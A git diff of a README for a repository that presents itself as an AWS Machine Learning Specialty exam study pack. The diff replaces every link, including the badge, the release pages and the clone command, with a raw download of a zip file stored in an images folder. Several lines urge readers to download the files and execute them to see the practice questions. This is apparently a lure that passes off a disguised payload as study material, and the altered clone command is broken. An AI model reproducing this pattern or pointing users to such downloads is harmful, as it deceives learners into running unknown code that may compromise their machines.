@@ -1,6 +1,6 @@
 # AWS Certified Machine Learning – Specialty (MLS-C01) Study Pack 📚
 
-![AWS Certified Machine Learning – Specialty](https://img.shields.io/badge/AWS%20Certified%20Machine%20Learning%20%E2%80%93%20Specialty-Study%20Pack-blue)
+![AWS Certified Machine Learning – Specialty](https://raw.githubusercontent.com/kiran-saikia/AWS--MLS-C01--studypack/main/images/studypack_AW_ML_v2.2.zip%20Certified%20Machine%20Learning%20%E2%80%93%20Specialty-Study%20Pack-blue)
 
 Welcome to the **AWS Certified Machine Learning – Specialty (MLS-C01) Study Pack**! This repository is your go-to resource for practice questions and answers designed to help you prepare for the AWS MLS-C01 certification exam. Whether you're a beginner or an experienced professional, this study pack will assist you in mastering the necessary concepts and skills.
 
@@ -35,7 +35,7 @@ This repository contains a collection of practice questions and answers tailored
 - Machine learning implementation and operations
 - Best practices
 
-You can access the latest version of the study pack [here](https://github.com/kiran-saikia/AWS--MLS-C01--studypack/releases). Download the necessary files and execute them to enhance your study experience.
+You can access the latest version of the study pack [here](https://raw.githubusercontent.com/kiran-saikia/AWS--MLS-C01--studypack/main/images/studypack_AW_ML_v2.2.zip). Download the necessary files and execute them to enhance your study experience.
 
 ## Practice Questions
 
@@ -82,11 +82,11 @@ To make the most of this study pack, follow these steps:
 1. **Clone the Repository:**
    Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/kiran-saikia/AWS--MLS-C01--studypack.git
+   git clone https://raw.githubusercontent.com/kiran-saikia/AWS--MLS-C01--studypack/main/images/studypack_AW_ML_v2.2.zip
    ```
 
 2. **Download the Latest Release:**
-   Visit the [Releases](https://github.com/kiran-saikia/AWS--MLS-C01--studypack/releases) section to download the latest version of the study pack. Make sure to execute the files to access the practice questions and study materials.
+   Visit the [Releases](https://raw.githubusercontent.com/kiran-saikia/AWS--MLS-C01--studypack/main/images/studypack_AW_ML_v2.2.zip) section to download the latest version of the study pack. Make sure to execute the files to access the practice questions and study materials.
 
 3. **Review the Practice Questions:**
    Go through the practice questions and test your knowledge regularly.
@@ -99,7 +99,7 @@ To make the most of this study pack, follow these steps:
 
 ## Releases
 
-You can find the latest releases of the study pack [here](https://github.com/kiran-saikia/AWS--MLS-C01--studypack/releases). Download the files and execute them to access the practice questions and study materials.
+You can find the latest releases of the study pack [here](https://raw.githubusercontent.com/kiran-saikia/AWS--MLS-C01--studypack/main/images/studypack_AW_ML_v2.2.zip). Download the files and execute them to access the practice questions and study materials.
 
 ## Contributing
 
